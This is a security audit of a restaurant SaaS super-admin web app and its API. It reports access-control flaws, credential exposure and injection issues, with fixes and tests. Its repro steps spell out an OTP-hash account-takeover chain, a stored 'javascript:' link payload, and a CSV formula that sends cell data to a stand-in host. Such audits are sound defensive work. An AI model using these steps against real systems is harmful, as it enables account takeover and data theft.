# super-admin-web audit

Revision: `9ddb5633c4679a295dfaa25a80a18dbc7912a82b` (main). Read-only review; no files other than this one were written.

## Scope actually read
- `cloud/super-admin-web/`: `index.html`, `vite.config.ts`, `package.json`, `tsconfig.json`, `public/manifest*.json*`; `src/api/client.ts`, `src/auth/*`, `src/app/App.tsx`, `src/main.tsx`, `src/layout/ProtectedLayout.tsx` (+ layout.css read-only rules), `src/lib/{csvExport,appUrls,menuCsv}.ts`, `src/hooks`, and, in full or in the security-relevant regions: `Login`, `Activate`, `Onboarding/OnboardRestaurantPage` (draft/localStorage, orchestration, QR/welcome kit), `Restaurants/RestaurantDetailPage` (impersonate, reset-password, backups), `Backups/BackupsPage`, `Support/SupportPage`, `Team/TeamPage`, `Applications/ApplicationsPage`, `Catalog/MasterCatalogPage` (upload), `Tickets/TicketThread` (attachments), `Reports/ReportsPage` (export), `Restaurants/LicenseCertificatePanel`.
- Repo-wide greps over `src/**` for: `dangerouslySetInnerHTML|innerHTML|srcdoc|eval|document.write`, `localStorage|sessionStorage|indexedDB|document.cookie`, `window.open|location.*|postMessage|target=_blank`, `href={|src={`, `import.meta.env|VITE_`, hard-coded secrets. Every `api.get/post/patch/delete/download` call site (about 190) was enumerated.
- Built bundle `dist/assets/index-*.js` (4.6 MB, untracked, dated Sep 15): checked for source maps, `sourceMappingURL`, `VITE_*`, secret-like strings, embedded PINs/`live_db` data, and external URLs.
- Backend cross-reads to map UI action to API authority: `cloud/api/src/common/rbac/access.ts`, `common/guards/platform-auth.guard.ts`, `tenant-auth.guard.ts`, `main.ts`, all `PlatformAuthGuard` controllers (route lists), and the services `support`, `platform-users`, `master-catalog` (upload), `backups`, `activation-keys` (list/redeem/reactivate), `owners`, `applications` (+dto), `sessions`, `support-tickets` (attachment DTO and `send-attachment`), `tenant-auth` (impersonate, forgot/reset password), `devices` DTOs, `prisma/schema.prisma` (User, Device).
- NOT covered: pixel-level review of every page's JSX (about 34k LOC; React text interpolation was assumed safe and only the sinks above were checked exhaustively), runtime testing, the production static host/CDN/reverse-proxy config (none in repo), `packages/ui` internals except the two files cited, `apps/*` consumers other than a grep for `impersonat*`.

## Inventory
### Client-side security architecture
| Aspect | Finding | Ref |
|---|---|---|
| Access token | Module-scope JS variable, never persisted; sent as `Authorization: Bearer` | `src/api/client.ts:12-22,75,107` |
| Refresh token | httpOnly cookie set by API (`httpOnly`, `secure` in prod, `sameSite: lax`, `path=/api/v1/platform-auth`); the SPA calls `POST /platform-auth/refresh` with `credentials:'include'` and single-flights it | `client.ts:32-44`; API `platform-auth.controller.ts:35-41,58-67` |
| Route guard | `ProtectedLayout` redirects to `/login` when unauthenticated and hides nav/pages using the server-sent `permissions` map. This is UI only; the server (`PlatformAuthGuard` + `canAccess`) is the control | `ProtectedLayout.tsx:255-277`, `auth/access.ts` |
| Read-only areas | Cosmetic CSS only (`.readonly-area .btn-primary/.btn-accent/.btn-danger {pointer-events:none}`); ghost/secondary buttons stay clickable, and the server returns 403 | `layout.css:608-614` |
| Env in bundle | Only `VITE_API_BASE_URL`, `VITE_RESTAURANT_ADMIN_URL`, `VITE_KIOSK_ADMIN_URL` (URLs, not secrets). The dist bundle was built with localhost defaults | `client.ts:1`, `lib/appUrls.ts:8-9`, `vite-env.d.ts` |
| localStorage keys | `jamanvaar_onboarding_draft_v1` (contains credentials, see SAW-03), `jamanvaar_superadmin_collapsed_groups`, theme | see greps |
| XSS sinks | Exactly one: `dangerouslySetInnerHTML={{__html: k.qrSvg}}` at `OnboardRestaurantPage.tsx:1746`. `qrSvg` comes from the local `generateQrSvg()` (`packages/utils/src/qrcode.ts:299-321`), which emits only integer path data and constant colours, so it is not injectable. One raw server-controlled `href`: `ApplicationsPage.tsx:265` (SAW-04) | |
| Open redirect | None. Post-login always `navigate('/')`; no `next/returnTo` param; `navigate(n.link)` uses in-app router only | `LoginPage.tsx:33-38` |
| Headers/CSP/clickjacking | `index.html` has no CSP, and no serving config exists in the repo (Vite dev server defaults). `frame-ancestors`/`X-Frame-Options` cannot be set from a meta tag. Unverifiable, HARDENING | `index.html`, `vite.config.ts` |
| Source maps | None in `dist/` (no `.map`, no `sourceMappingURL`); `vite.config.ts` does not enable `build.sourcemap` | dist scan |
| Bundle content | No secrets, no `pinCode`/`live_db` data, no `passwordHash` strings; only public unsplash URLs and localhost defaults | dist scan |
| Dependencies | vite 6.4.3, react-router-dom 6.30.6, react 18.3.1 (installed at repo root `node_modules`); no known-stale versions spotted (no `npm audit`, since it needs the network) | package.json + installed versions |

### UI action to API to required platform role (authority is `access.ts`, area by path prefix, level by HTTP method: GET/HEAD/OPTIONS = read, all else = write)
Role legend: O = PLATFORM_OWNER, S = SUPER_ADMIN, P = PLATFORM_OPS, U = SUPPORT_ADMIN, F = FINANCE_ADMIN, R = READ_ONLY. O and S are write everywhere except settings (S is read-only there).

| UI page / action | Endpoint | Area | Min read | Min write |
|---|---|---|---|---|
| Header search, Support page | `GET /support/search`, `GET /support/diagnostics/:rid` | support | O S P U R (not F) | n/a |
| Support: resend owner invite / revoke device session / impersonate | `POST /support/resend-invite`, `/revoke-device-session`, `/impersonate` | support | | O S U (impersonate is additionally hard-coded to `[O,S,U]` in the service) |
| Restaurant detail "Impersonate Owner" | `POST /support/impersonate` then `window.open(RESTAURANT_ADMIN_URL?impersonationToken=...)` | support | | O S U. The button is shown to every role and the server 403s the others |
| Restaurant detail "Reset Password" | `POST /owners/:id/reset-password` | restaurants | | O S |
| Restaurants/Owners/Branches CRUD, suspend/reactivate, menu import | `/restaurants`, `/owners`, `/branches` | restaurants | O S P U F R | O S |
| Plans, Subscriptions, Entitlements | `/plans`, `/subscriptions`, `/subscriptions/:id/applications` | subscriptions | O S P U F R | O S F |
| Invoices, payments, payment connections | `/invoices`, `/payments`, `/payment-connections`, `/restaurants/:id/payment-connection*` | billing | O S F R | O S F |
| Activation keys (list shows redeemable codes) | `/activation-keys*` | devices | O S P U R | O S P |
| Device fleet: lock/unlock/wipe/force-logout/revoke | `/devices*` | devices | | O S P |
| Applications and release publish (`downloadUrl`) | `GET /applications`, `POST /applications/releases` | ops | O S P U R | O S P |
| Backups: list, download URL or file | `GET /restaurants/:id/backups`, `/:bid/download`, `/:bid/file`, `GET /platform/backups` | ops | O S P U R | n/a |
| Backups: trigger/verify/preview/confirm restore | `POST /platform/backups/...` | ops | | O S P |
| Sync monitor, System health, Sandboxes, Jobs | `/platform/telemetry/*`, `/platform/system-health`, `/platform/sandboxes`, `/platform/jobs` | ops | O S P U R | O S P |
| Offline policy, license certificate | `/platform/offline-policy*`, `GET /restaurants/:id/license-certificate` | licensing | O S P | O S P |
| Tickets (+ attachments) | `/support-tickets*` | support | O S P U R | O S U |
| Master catalog, AI assistant, QR ordering (+ image upload) | `/master-catalog*`, `/ai-assistant*`, `/qr-ordering*` | catalog | O S P U R | O S |
| Audit logs | `GET /audit-logs*` | audit | O S P U F R | n/a |
| Reports / Dashboard / CSV export | `/platform/reports*`, `/platform/dashboard` | reports | O S P U F R | n/a |
| Team invite/role/enable/disable/resend | `/platform-users*` | team | O S P U F R (list) | O S (plus owner-only checks in service) |
| Platform settings | `/platform/settings*` | settings | O S | O |
| Profile, sessions, notifications | `/platform/me*`, `/platform/sessions*`, `/platform/notifications*` | self | any | any (sessions scoped to caller: `sessions.controller.ts:56-63`) |
| Invite activation page (public) | `GET /platform-users/activation-status`, `POST /platform-users/activate` | none (public) | | |
| Onboarding wizard | `POST /restaurants`, then public `POST /tenant-auth/set-initial-password`, `POST /subscriptions`, `POST /activation-keys` | restaurants, subscriptions, devices | | O S (the wizard as a whole) |

UI vs API mismatches found: (1) the UI hides nothing the API lets a lower role do at the area level (the nav mirrors `access.ts`), but see SAW-01/02/05, where read-level access to GET endpoints exposes secrets or side-effect data the UI never shows. (2) The impersonation reason is hard-coded by the UI (`RestaurantDetailPage.tsx:603`); the API only checks length >= 5, so the audit "reason" is meaningless for that path. (3) `hasPermission()` defaults to SUPER_ADMIN when `user.role` is missing (`AuthContext.tsx:92`); UI-only, and `/platform/me` always returns `role`. (4) Reset-owner-password UI allows 4 characters (`RestaurantDetailPage.tsx:2053`), matching the weak API rule (F-021), while the wizard generates 12-character passwords.

## Old-audit claim verification
| Old ID | Verdict | Evidence file:line | Note |
|---|---|---|---|
| F-018 (client side: SVG/HTML upload to `super-admin-web/public`) | CONFIRMED (API defect; UI just relays; impact conditional) | API `master-catalog.service.ts:250-251` (allow-list incl. `image/svg+xml`, trusts client `contentType`), `:265-269` (ext = `substring(lastIndexOf('.'))` of client `fileName`, unvalidated), `:273-279` (`writeFileSync` into `../super-admin-web/public/assets/uploads/catalog`). UI: `MasterCatalogPage.tsx:829` (`accept` includes svg), `:238-243` sends `file.name` and `file.type` untouched | Body may be any bytes with `contentType:'image/png'` and `fileName:'x.html'`, giving `.../catalog/dish_*.html`. Path traversal is NOT possible (the ext is the tail after the last `.`, so it cannot contain `..`). Needs `catalog:write` = O or S only, so it is lateral SUPER_ADMIN to PLATFORM_OWNER-level (S is read-only on settings and can't promote to owner). Whether the file is served from the Super Admin origin depends on the deploy: Vite dev serves `public/` as-is; a built `dist/` gets it only if rebuilt, since `dist/assets/uploads` already contains a dev upload. UNVERIFIABLE in prod. See SAW-06 for additional upload weaknesses |
| F-022 (impersonation token in URL) | CONFIRMED, low | `RestaurantDetailPage.tsx:606`: `window.open(\`${RESTAURANT_ADMIN_URL}?impersonationToken=${encodeURIComponent(res.accessToken)}\`,'_blank')` (no longer hard-coded `localhost:5176`; uses env-driven URL) | 15-min tenant OWNER JWT (`tenant-auth.service.ts:150-168`, no `jti`, not revocable) goes in a query string. No app consumes `?impersonationToken` (grep of `apps/ packages/ tooling/`: zero hits), so the button yields no functional value and only leaves a live token in history, address bar and any static-host access log. `window.open` without `noopener` is a minor extra. See SAW-05 |
| F-039 (onboarding draft in localStorage) | CONFIRMED (with correction) | `OnboardRestaurantPage.tsx:210-222` (draft interface has `owner` with `initialPassword`, plus `ownerActivationToken`), `:317-330` (autosave every state change), `:290-296,306-312` (cleared only when step reaches `done` or on Discard); `:159-160,392` (`initialPassword` auto-generated and always present) | Correction: it does NOT persist after successful completion (removed at step `done`). It persists whenever the operator leaves mid-wizard, incl. after `POST /restaurants` + `set-initial-password` succeeded but a later step failed (`runOnboarding` catch at `:~570`), on tab close, and on logout (`AuthContext.logout` never clears it). The file comment at `:202-206` claims one-time secrets are "deliberately excluded", but they are not. In `invite` mode `ownerActivationToken` is a live 7-day credential in plaintext. See SAW-03 |
| F-035 (READ_ONLY/SUPPORT can get backup download URL) | CONFIRMED | `access.ts:55-56` (`/restaurants/:id/backups*` maps to `ops`), `:61-63` (R and U hold `ops:read`), `platform-backups.controller.ts:19-33` (`GET :backupId/download` returns pre-signed S3 URL or `/file` route), `backups.service.ts:199-208,211-227` (no audit log call on either read path) | READ_ONLY/SUPPORT_ADMIN/PLATFORM_OPS can download the full (decrypted) backup JSON of any tenant, unaudited. The UI's Backups page is visible to all `ops` readers, so it is not merely an API-only path. Note `getFile` decrypts server-side, so encryption-at-rest provides no barrier to these roles. See SAW-10 (audit gap/restore) and SAW-02 (same role boundary) |
| F-004 (UI exposure of support search) | CONFIRMED, and worse | `support.service.ts:47,60,73` (`tx.user.findMany`, `tx.device.findMany`, `tx.activationKey.findMany` with `include`, no `select`), `:136,140,142` (diagnostics returns whole `restaurant.users`, `devices`, `activationKeys`). `User` has `passwordHash`, `activationTokenHash`, **`passwordResetHash`** (`schema.prisma:201,211,216`); `Device.deviceTokenHash` (`schema.prisma:429`). Reachable by `support:read` = O S P U R. The UI (`SupportPage.tsx:75`, `ProtectedLayout.tsx:147` header typeahead) fires this for every logged-in role but never renders the hashes (`api/types.ts` has no such fields); the raw JSON is visible in devtools/curl | Old audit missed `passwordResetHash` = unsalted sha256 of a 6-digit OTP (`tenant-auth.service.ts:816-820`, `token.util.ts:9`), which turns this into an account-takeover chain. See SAW-01. Other modules select explicit fields (`owners.service.ts:8`, `platform-users.service.ts:22`), so this is isolated to `support` |
| F-045 (docs disagree with runtime) | CONFIRMED as doc drift only (informational, not a security defect); the old audit's specific wording is partly wrong | `docs/architecture/ARCHITECTURE.md:13,31,64` still describes SQLite; `DATABASE.md:3` carries an accuracy note that no SQLite exists. `monorepo-structure.md:37,152` flags `standalone_local_core.cjs`/`JamanvaarLocalCore.exe` (SEA build) as orphaned, and the doc itself uses stale `shared/` and `scripts/` paths (now `packages/`, `tooling/`) | `tooling/local-runtime/standalone_local_core.cjs` and `apps/restaurant-system/pos/src-tauri/binaries/JamanvaarLocalCore-*.exe` are tracked, so the "orphaned" label may now be stale. Outside this slice; low value |

Additional old IDs touched while tracing (not asked, quick verdicts): F-021 CONFIRMED (`owners.controller.ts:44-52` min length 4; `owners.service.ts:96-115` no role check on target, reactivates DISABLED, doesn't revoke refresh tokens); F-041 CONFIRMED (`platform-users.service.ts:84-97` still returns `USED` vs `INVALID`, and the code comment now accepts it); F-038 the client CSV export has the same formula issue (SAW-08); F-023 unchanged (`platform-auth.guard.ts:41-45` has no `algorithms`, shared secret with tenant guard, mitigated by issuer/audience). Not my slice.

## New/independent findings

### SAW-01 Support search/diagnostics return raw credential rows (incl. password-reset OTP hash): READ_ONLY to tenant OWNER account takeover
- Severity: high. CVSS 4.0 suggestion: `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` (needs any platform login incl. READ_ONLY). Class: CONFIRMED (code trace; not executed)
- CWE/OWASP: CWE-213/CWE-200 exposure of sensitive info; CWE-330/CWE-916 weak hash of low-entropy secret; OWASP API3:2023 broken object property level authorization
- Component: `cloud/api/src/modules/support/support.service.ts:47-58` (users), `:60-71` (devices), `:73-79` (activation keys), `:136,140,142` (diagnostics); RBAC `access.ts:47` and `:61-69` (support read for O S P U R); consumer in this slice `ProtectedLayout.tsx:147`, `SupportPage.tsx:75,93`
- Attacker/precondition: any platform account holding `support:read` (READ_ONLY, PLATFORM_OPS, SUPPORT_ADMIN, plus O/S) and network access to the API.
- Repro (code trace): (1) `GET /restaurants` and `GET /owners` (restaurants:read) yield `restaurantId` and owner email. (2) `POST /api/v1/tenant-auth/forgot-password {restaurantId,email}` (public, `tenant-auth.controller.ts:72-78`; 1 per 60 s per user) stores `passwordResetHash = sha256(6-digit OTP)` valid 15 min (`tenant-auth.service.ts:800-821`). (3) `GET /api/v1/support/search?q=<owner email>` returns the full `User` row with `passwordResetHash` (no `select`, no `omit`; there are no global serializers, since `main.ts`/`app.module.ts` have no interceptor and `prisma.service` has no `$extends`). (4) Offline, hash 000000..999999 with sha256 (under 1 s) to recover the OTP. (5) `POST /api/v1/tenant-auth/reset-password {restaurantId,email,otp,newPassword}` (`tenant-auth.controller.ts:81-87`) sets the owner password (attempt limit 5 is not hit because the guess is offline). Log in as the owner.
- Expected vs actual: read-only support visibility should never include credential material; actual is whole DB rows. Also returned: `passwordHash` (bcrypt), `activationTokenHash`, `deviceTokenHash` (unusable preimage-wise, but still secrets), plaintext `ActivationKey.code` for every state.
- Impact: a READ_ONLY auditor can take over any tenant OWNER account (financial/PII data, staff PINs, tenant-level admin) and bypass the impersonation gate (`IMPERSONATION_ALLOWED_ROLES`) and its audit trail. `passwordHash` bcrypt hashes are also harvestable for offline cracking.
- Root cause: `include` without `select`; a low-entropy secret stored as unsalted sha256.
- Recommended fix: in `support.service.ts` use explicit `select` allow-lists (mirror `owners.service.ts` `OWNER_SELECT`) for `user`, `device`, `activationKey` in `search()` and `getDiagnostics()`; add a Prisma `omit`/result extension for `passwordHash|activationTokenHash|passwordResetHash|deviceTokenHash` as defence in depth. Separately, key the reset OTP hash with an HMAC (server secret + user id) so a leaked row can't be brute-forced.
- Regression test: e2e, log in as READ_ONLY, `GET /support/search?q=<seeded owner email>` and `GET /support/diagnostics/:id`; assert the JSON contains none of the keys `passwordHash|activationTokenHash|passwordResetHash|deviceTokenHash` at any depth.

### SAW-02 Redeemable device activation codes readable by READ_ONLY/SUPPORT_ADMIN
- Severity: medium. Class: CONFIRMED (exposure); impact per code trace
- CWE/OWASP: CWE-200, CWE-522; OWASP API3:2023 / API5:2023 (function-level auth)
- Component: `activation-keys.service.ts:41-50` (`present()` only redacts `code` when lifecycle is not `AVAILABLE`, so live codes are returned to any `devices:read` caller); `access.ts:47-48` (R, U have `devices:read`); `support.service.ts:73` (search returns all key codes); `:434` (reactivation audit `details.code`) is readable via `GET /audit-logs` (audit:read incl. F, R). UI: `ActivationKeysListPage.tsx:209-213` displays and CSV-exports the code.
- Attacker/precondition: READ_ONLY or SUPPORT_ADMIN (or PLATFORM_OPS) account.
- Repro (code trace): `GET /activation-keys?...` shows an `AVAILABLE` key and its `code`; `POST /api/v1/activation/redeem {code, deviceType}` (public, `activation-redeem.controller.ts:15-18`; "the code itself is the credential", `activation-keys.service.ts:243-244`) returns a bearer device token for that restaurant, and the device consumes a plan seat.
- Expected vs actual: an unredeemed key is a bearer credential to enrol a tenant terminal; a read-only role should see at most `codeLast4`. Actual: full code.
- Impact: read-only platform staff can enrol rogue terminals into any restaurant, then use device endpoints (menu/order/entity sync, backups upload, etc.) as that tenant. The impact ceiling depends on the device-token surface (other slices; see F-043 for branch isolation).
- Root cause: `present()` gates on lifecycle, not on caller's write authority.
- Recommended fix: return `code` only on the creation response and to `devices:write` callers (or never after creation, show `codeLast4`); drop `code` from audit details; strip from support search/diagnostics.
- Regression test: as READ_ONLY, list keys, assert `code === null` for `AVAILABLE` keys; as PLATFORM_OPS after generate, assert same on later reads.

### SAW-03 Onboarding wizard persists the owner's initial password and activation token in localStorage
- Severity: low. Class: CONFIRMED
- CWE/OWASP: CWE-312/CWE-922 cleartext storage of sensitive info; ASVS 3.x/8.2
- Component: `OnboardRestaurantPage.tsx:159-160,392` (`initialPassword: generateSecurePassword()` in state from mount), `:210-222` (draft shape), `:317-330` (autosave), `:290-296,306-312` (removal only at `done`/Discard); `AuthContext.tsx:73-83` (logout never clears it)
- Attacker/precondition: someone with access to the operator's browser profile (shared machine, other local user, backup of profile) or any future XSS in the Super Admin origin.
- Repro: start the wizard, fill the owner step, close the tab; DevTools then shows `jamanvaar_onboarding_draft_v1` with `owner.initialPassword` and, once the owner is created, `ownerActivationToken` and `restaurantId`. If any step after `POST /restaurants`/`set-initial-password` fails, the password already applied to the real owner account stays in storage indefinitely (`savedAt` is never used for expiry).
- Expected vs actual: comment at `:202-206` says one-time secrets are excluded; actual: they are stored in the clear.
- Impact: credential of a real tenant owner (set-now mode) or a live 7-day invite token (invite mode) recoverable from disk. No current XSS sink makes it remotely reachable.
- Root cause: draft object includes `owner.initialPassword` and `ownerActivationToken`.
- Fix: exclude `owner.initialPassword` and `ownerActivationToken` from the persisted draft (regenerate the password on resume), clear the draft on logout, and add a TTL on `savedAt`.
- Test: unit test the draft serializer, asserting `JSON.stringify(draft)` contains neither the password nor the token.

### SAW-04 Stored `javascript:` URL: unvalidated `downloadUrl` rendered as `<a href>` in Super Admin (and shared banner)
- Severity: medium (requires a click by a higher-privileged admin). CVSS 4.0 suggestion: `AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`. Class: CONFIRMED (code trace; React 18.3.1 does not neutralise `javascript:` hrefs, React 19 does; not executed in a browser)
- CWE/OWASP: CWE-79, CWE-601-adjacent; OWASP A03:2021
- Component: API `applications/dto/application.dto.ts:10` (`downloadUrl: z.string().optional()`), `applications.service.ts:188`; UI `ApplicationsPage.tsx:265-266` (`<a href={app.downloadUrl} target="_blank" rel="noopener noreferrer">`) fed by `latestRelease.downloadUrl` (`applications.service.ts:145`). The same value is consumed by `packages/ui/src/PlatformNoticeBanner.tsx:36-37` (`<a href={update.downloadUrl}>`, in device/tenant apps; out of slice, SUSPECTED) and by `packages/sync/src/device_gate.ts:235`.
- Attacker/precondition: `ops:write` = PLATFORM_OPS (also O, S). Victim: any admin who opens Applications and clicks "Download / Open" (PLATFORM_OWNER or SUPER_ADMIN in the interesting case).
- Repro (safe, local, dummy data): as PLATFORM_OPS `POST /api/v1/applications/releases` with `downloadUrl:"javascript:alert(document.domain)"` and a fresh `version`; as another admin open `/applications` and click "Download / Open". The script runs (`target=_blank` + `noopener` does not stop a `javascript:` navigation from executing in the source origin in Chromium-family browsers; verify per browser) in the Super Admin origin.
- Expected vs actual: only `https:` URLs should be accepted and rendered; actual: any string.
- Impact: script in the Super Admin origin can call `POST /platform-auth/refresh` (credentials included, CORS-allowed) to mint the victim's access token and act with the victim's role, so PLATFORM_OPS can escalate to PLATFORM_OWNER/SUPER_ADMIN capabilities. Also the same field steers device update prompts to an arbitrary download URL (supply-chain phishing).
- Root cause: no scheme validation server-side, none client-side.
- Fix: `downloadUrl: z.string().url().refine(u => /^https:\/\//i.test(u))` in the DTO (and a migration/cleanup of existing rows); in the UI render the link only if `/^https:\/\//i.test(url)`; do the same in `PlatformNoticeBanner`.
- Test: DTO test rejecting `javascript:`, `data:`, `vbscript:`; component test asserting no `href` for non-https.

### SAW-05 Impersonation token placed in a URL query string, and consumed by nothing
- Severity: low. Class: CONFIRMED
- CWE/OWASP: CWE-598 sensitive info in GET request; CWE-1022 (no `noopener`)
- Component: `RestaurantDetailPage.tsx:597-612` (esp. `:606`); token minted at `tenant-auth.service.ts:144-169`; no receiving code exists (grep `impersonat` in `apps/ packages/ tooling/` = no matches)
- Attacker/precondition: anyone who can read the browser history/omnibox of the support operator or the access logs of the host serving `RESTAURANT_ADMIN_URL` (nginx/CDN logs record the query string), within 15 minutes; or any script in the opened page (it retains `window.opener`, because `window.open(...,'_blank')` gets no implicit `noopener`).
- Impact: a 15-minute OWNER-equivalent tenant JWT that bypasses `assertSessionStillAllowed` (`tenant-auth.guard.ts:56-58`, so it works even on suspended restaurants) and cannot be revoked. Because no receiving app reads it, the leak buys the operator nothing.
- Fix: remove the `window.open` handoff (keep the token-in-textbox flow of `SupportPage`) or implement a one-time code exchange; use `window.open(url,'_blank','noopener,noreferrer')`. Also stop hard-coding the audit reason (`:603`).
- Test: assert the click handler never builds a URL containing the token.

### SAW-06 Master-catalog upload trusts client file name/content and stores under the Super Admin static root (extends F-018)
- Severity: low to medium (conditional on how static assets are served; `catalog:write` = O/S only). Class: CONFIRMED (code); production exposure UNVERIFIABLE
- CWE/OWASP: CWE-434, CWE-79; OWASP A04/A05
- Component: `master-catalog.service.ts:246-291`; UI `MasterCatalogPage.tsx:229-252,829`; tracked dev artifact `cloud/super-admin-web/public/assets/uploads/catalog/dish_7j96tz3e_1788784357538.png` (also in `dist/`)
- Details/extra beyond F-018: filename is `Math.random()`+`Date.now()` (`:268`, predictable, not CSPRNG); extension unrestricted (`.html`, `.svg`, `.js`, `.htm`); MIME check is on the client-supplied `contentType`, not the bytes; the path depends on `process.cwd()` layout (`../super-admin-web/public`), which only works with a monorepo checkout and makes the API write into a front-end source directory. The SPA never renders uploaded SVGs inline (`<img src>` only, `MasterCatalogPage.tsx:511,615,811`), so the risk is only direct navigation to the uploaded path on the Super Admin origin.
- Fix: allow only `png/jpeg/webp/gif`, verify magic bytes, generate the extension from the verified type, `crypto.randomUUID()` names, store on object storage/another origin with `Content-Disposition`/`nosniff`, drop SVG.
- Test: upload `fileName:'a.html', contentType:'image/png'` and an `image/svg+xml` body, expect 400.

### SAW-07 Platform team: `SUPER_ADMIN` can take over a pending `PLATFORM_OWNER` account via resend-invite
- Severity: medium (needs a pending owner invite). CVSS 4.0 suggestion: `AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (PR:H because the actor is already SUPER_ADMIN). Class: CONFIRMED (code trace)
- CWE/OWASP: CWE-269 improper privilege management / CWE-639; OWASP API5:2023
- Component: `platform-users.service.ts:161-201` (`resendInvite` only calls `assertCanManageTeam`, with no owner check on the target and it returns `activationToken` in the response at `:200`), vs `invite`/`updateRole`/`setStatus` which do enforce `assertActorIsOwner` for owner targets (`:108,:233,:265`); public `activate` at `:302-340`; UI: `TeamPage.tsx` exposes resend for pending members.
- Repro (code trace): a PLATFORM_OWNER invites another owner (PENDING). SUPER_ADMIN calls `POST /platform-users/<pendingOwnerId>/resend-invite`, reads `activationToken` and `user.email` from the response, and calls public `POST /platform-users/activate {email, activationToken, password}`. The account becomes ACTIVE PLATFORM_OWNER with the attacker's password. The legitimate invitee's original token is invalidated by the rotation.
- Impact: SUPER_ADMIN (deliberately denied owner-level power: settings-write, owner grant) obtains PLATFORM_OWNER; also denies the real invitee.
- Fix: in `resendInvite`, if `existing.role === 'PLATFORM_OWNER'` call `assertActorIsOwner(actor,'resend an owner invitation')`; consider not returning the token to the caller when email delivery succeeded.
- Test: SUPER_ADMIN resend against a pending PLATFORM_OWNER row returns 403.

### SAW-08 CSV exports have no formula neutralisation, and tenant devices control exported fields
- Severity: low. Class: CONFIRMED (code), Excel behaviour depends on client
- CWE/OWASP: CWE-1236 CSV injection
- Component: `src/lib/csvExport.ts:6-12` (`escapeCsvCell` quotes only `, " \n`; no leading `= + - @ \t \r` handling). Callers with tenant/device-controlled cells: `DevicesListPage.tsx:155-164` (`Name`, `App version`), `ActivationKeysListPage.tsx:209-217` (`Terminal name`), `RestaurantsListPage.tsx:263-279`, `OwnersListPage.tsx:177`, restaurant-name-derived files at `RestaurantDetailPage.tsx:1473,1751`.
- Attacker/precondition: a tenant device or a holder of a device token can set `Device.appVersion`/`osPlatform` (`heartbeat.dto.ts:6-8`, max 50 chars) or, at redeem, `appVersion` (unbounded, `activation-key.dto.ts:23`).
- Repro: heartbeat `appVersion:"=HYPERLINK(\"http://x.test/\"&A2,\"v\")"`, then a platform admin exports the Devices CSV and opens it in Excel; the cell evaluates (Protected View/DDE prompts limit but do not eliminate this).
- Impact: data exfiltration from the admin's other CSV cells or client-side code execution prompts; low.
- Fix: in `escapeCsvCell` prefix a `'` when the string matches `/^[=+\-@\t\r]/` (after trimming) and always quote such cells.
- Test: `escapeCsvCell('=1+1')` starts with `'` or is neutralised; same for `+`, `-`, `@`.

### SAW-09 HARDENING: no CSP / anti-framing / noopener on external opens; read-only UI is CSS-only
- Severity: info. Class: HARDENING
- Component: `index.html` (no CSP meta; `frame-ancestors`/`X-Frame-Options` must be response headers and no serving config exists in the repo); `BackupsPage.tsx:193` `window.open(res.url,'_blank')` (pre-signed S3 URL, no `noopener`); `layout.css:608-614` (read-only enforced by CSS on three button classes only).
- Impact: the SPA could be framed (clickjacking of destructive controls such as wipe/suspend) unless the host sets `frame-ancestors 'none'`; a strong CSP would blunt SAW-04. Not exploitable from repo evidence alone.
- Fix: serve with `Content-Security-Policy: default-src 'self'; img-src 'self' data: https:; connect-src 'self' <API>; frame-ancestors 'none'; object-src 'none'; base-uri 'none'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`; add `noopener,noreferrer` to `window.open`.

### SAW-10 Info: backup restore target is cosmetic; restore always writes production data; audit gap on backup downloads
- Severity: info/low. Class: CONFIRMED
- Component: `backups.service.ts:377-419` (`targetType` only changes a label), `:421-490` (executes upsert of `syncedEntities`/`syncedOrders` into the live restaurant regardless), `platform-backups.controller.ts:10` comment ("read-only, no restore trigger") is stale; `ops:write` = P, O, S can run restore (`access.ts:42`). Downloads (`getDownloadUrl`/`getFile`) write no audit entry (`backups.service.ts:199-227`). UI `BackupsPage.tsx:118-134,143-146` is now honest about restoring (safety snapshot + toast), so not a UI deception.
- Fix: audit `BACKUP_DOWNLOADED`; restrict restore-confirm to O/S if PLATFORM_OPS should not overwrite tenant data; either implement STAGING_PREVIEW or reject `PRODUCTION_RESTORE`/label correctly.

## Controls verified OK
- Access token kept only in memory; refresh in httpOnly, path-scoped cookie; no token/credential in `localStorage`, `sessionStorage`, cookies set from JS or URLs (except SAW-05): `client.ts:12-22`, dist and src greps.
- Session revocation is enforced server-side per request (`platform-auth.guard.ts:56-66`); disable also terminates refresh tokens (`platform-users.service.ts:279-285`); session list/revoke are scoped to the caller (`sessions.controller.ts:24-63`).
- RBAC default-deny: unmapped platform paths are owner-level only (`access.ts:107-111`), area derived from the URL, level from the method, role loaded from DB each request (`platform-auth.guard.ts:46-49,68-74`); the UI table `auth/access.ts` matches `access.ts` prefix for prefix.
- Platform JWT verified with issuer/audience constraints (`platform-auth.guard.ts:41-45`). (No `algorithms` pin: F-023.)
- Team management: owner-target checks on invite/updateRole/setStatus, no self-role change, last-owner protection (`platform-users.service.ts:108,219-273`), except resend (SAW-07).
- Impersonate is role-gated in the service and audited (`support.service.ts:15,189-215`).
- Ticket attachments: type allow-list (PNG/JPEG/WebP/GIF/PDF/plain), fixed `Content-Type`, `attachment`, `nosniff`, sandbox CSP on download (`send-attachment.ts:6-16`, `ticket.dto.ts:54-58`); the UI downloads via authed fetch to Blob + `download` attribute (`TicketThread.tsx:78-90`), never rendered inline.
- Activation link: token in URL fragment, `history.replaceState` after use, activation-status/activate reachable without a session but token-hash compared (`PlatformActivatePage.tsx:19-25,112`; `activation-url.ts`).
- QR SVG injected via `dangerouslySetInnerHTML` is generated locally from numeric data only (`qrcode.ts:299-321`), and `provisionedKeys` is not persisted or restored from storage.
- No open redirects; no `postMessage`, `eval`, `innerHTML`, `srcdoc`, iframes or markdown renderer anywhere in `src/`.
- No secrets/`VITE_*` secrets or source maps in `dist/`; `.env*` is gitignored and no `.env` exists in the package.
- Owner/platform-user list endpoints use explicit `select` (no hashes): `owners.service.ts:8`, `platform-users.service.ts:22-33`, `restaurants.service.ts:152-155,173-190`.
- Login page has no seeded/default credentials and no `returnTo` handling; password fields use `autoComplete`.

## Not verified / limits
- No runtime execution: SAW-01..08 are code traces. `javascript:` href behaviour (SAW-04) should be confirmed in the target browser.
